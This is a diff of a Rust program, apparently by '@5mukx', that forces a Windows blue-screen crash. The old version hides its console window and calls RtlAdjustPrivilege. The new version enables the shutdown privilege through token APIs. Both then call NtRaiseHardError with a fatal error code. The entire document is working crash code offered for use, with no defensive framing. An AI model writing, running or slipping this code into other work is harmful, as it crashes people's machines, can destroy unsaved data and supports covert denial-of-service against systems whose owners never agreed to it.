@@ -1,65 +1,64 @@
-// BSOD Trigger
-// Author: @5mukx
+/*
+    Program to invoke BSOD setting up privileges and provoking NtRaiseHardError. 
+    @5mukx
 
-use std::ptr::null_mut;
+*/
 
-use ntapi::{ntexapi::NtRaiseHardError, ntrtl::RtlAdjustPrivilege};
-use winapi::{shared::{ntdef::{BOOLEAN, NTSTATUS}, ntstatus::STATUS_SUCCESS}, um::{processthreadsapi::{GetCurrentProcess, SetPriorityClass}, winbase::HIGH_PRIORITY_CLASS, wincon::GetConsoleWindow, winuser::{MessageBoxW, ShowWindow, MB_ICONEXCLAMATION, MB_OK, MB_SYSTEMMODAL, SW_HIDE}}};
-use std::time::SystemTime;
+use std::ptr;
+use ntapi::ntexapi::NtRaiseHardError;
+use winapi::shared::ntstatus::STATUS_ASSERTION_FAILURE;
+use winapi::shared::wtypesbase::ULONG;
+use winapi::um::processthreadsapi::GetCurrentProcess;
+use winapi::um::processthreadsapi::OpenProcessToken;
+use winapi::um::securitybaseapi::AdjustTokenPrivileges;
+use winapi::um::winnt::{LUID, SE_PRIVILEGE_ENABLED, SE_SHUTDOWN_NAME, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY};
+use winapi::um::winbase::LookupPrivilegeValueA;
+use winapi::um::errhandlingapi::GetLastError;
+use std::ffi::CString;
 
-
-
-pub fn start_bsod(){
-    unsafe{
-        // new way to hide the console !
-        let console_window = GetConsoleWindow();
-
-        ShowWindow(console_window, SW_HIDE);
-
-        SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
-
-        let mut error_ret = STATUS_SUCCESS;
-
-        // enable shutdown privileges !
-        let mut enabled:BOOLEAN = 0;
-        let privilege = RtlAdjustPrivilege(19, 1 as BOOLEAN, 0 as BOOLEAN, &mut enabled);
-
-        if privilege != STATUS_SUCCESS {
-            error_ret = privilege;
-            cleanup(error_ret);
+pub fn bsod() {
+    unsafe {
+        let mut token_handle: winapi::um::winnt::HANDLE = ptr::null_mut();
+        if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut token_handle) == 0 {
+            println!("Failed to open process token.");
             return;
         }
 
-        // Trigger BSOD
-
-        let mut u_resp: u32 = 0;
-        let random = (SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs() as u32) & 0xF_FFFF;
-        let bsod_code = 0xC000_0000 | ((random & 0xF00) << 8) | ((random & 0xF0) << 4) | (random & 0xF);
-
-        let bsod = NtRaiseHardError(bsod_code as NTSTATUS, 0, 0, null_mut(), 6, &mut u_resp);
-
-        if bsod != STATUS_SUCCESS{
-            error_ret = bsod;
-            cleanup(error_ret);
+        let mut luid: LUID = LUID { LowPart: 0, HighPart: 0 };
+        let shutdown_privilege = CString::new(SE_SHUTDOWN_NAME).unwrap();
+        if LookupPrivilegeValueA(ptr::null(), shutdown_privilege.as_ptr(), &mut luid) == 0 {
+            println!("Failed to lookup privilege value. Error: {}", GetLastError());
             return;
         }
 
-        cleanup(error_ret);
-    }
-}
+        let tp: TOKEN_PRIVILEGES = TOKEN_PRIVILEGES {
+            PrivilegeCount: 1,
+            Privileges: [winapi::um::winnt::LUID_AND_ATTRIBUTES {
+                Luid: luid,
+                Attributes: SE_PRIVILEGE_ENABLED,
+            }],
+        };
 
+        AdjustTokenPrivileges(token_handle, 0, &tp as *const _ as *mut _, 0, ptr::null_mut(), ptr::null_mut());
 
+        if GetLastError() != 0 {
+            println!("Failed to adjust token privileges. Error: {}", GetLastError());
+            return;
+        }
 
-unsafe fn cleanup(error_ret: NTSTATUS){
-    if error_ret != STATUS_SUCCESS{
-        let message = format!("0x{:08X}", error_ret);
-        let message_wide: Vec<u16> = message.encode_utf16().chain(Some(0)).collect();
-
-        MessageBoxW(
-            null_mut(),
-                    message_wide.as_ptr(),
-                    "Returned\0".as_ptr() as *const u16,
-                    MB_OK | MB_ICONEXCLAMATION | MB_SYSTEMMODAL,
+        // Raise hard error
+        let mut response: ULONG = 0;
+        let status = NtRaiseHardError(
+            STATUS_ASSERTION_FAILURE,
+            0,
+            0,
+            ptr::null_mut(),
+            6,
+            &mut response
         );
+
+        if status != 0 {
+            println!("Failed to raise hard error. Status: {}", status);
+        }
     }
 }
